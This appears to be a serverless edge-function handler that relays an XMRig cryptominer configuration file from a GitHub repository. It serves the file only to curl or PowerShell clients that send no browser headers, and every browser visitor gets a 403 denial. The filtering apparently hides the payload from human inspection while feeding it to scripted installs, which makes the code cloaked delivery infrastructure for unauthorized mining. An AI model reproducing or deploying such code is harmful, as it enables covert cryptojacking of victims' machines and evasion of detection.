export const config = { runtime: 'edge' };

const URL = 'https://raw.githubusercontent.com/5q0r/xmrig-shared/main/assets/config.json';

export default async function handler(req) {
  const ua = (req.headers.get('user-agent')||'').toLowerCase();
  if (req.headers.get('accept-language') || req.headers.get('referer') || (!ua.includes('curl') && !ua.includes('powershell')))
    return new Response('アクセスが拒否されました。', { status: 403 });

  const r = await fetch(URL, { cache: 'no-store' });
  if (!r.ok) return new Response(`リモート取得失敗: HTTP ${r.status}`, { status: r.status });

  return new Response(r.body, { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
}
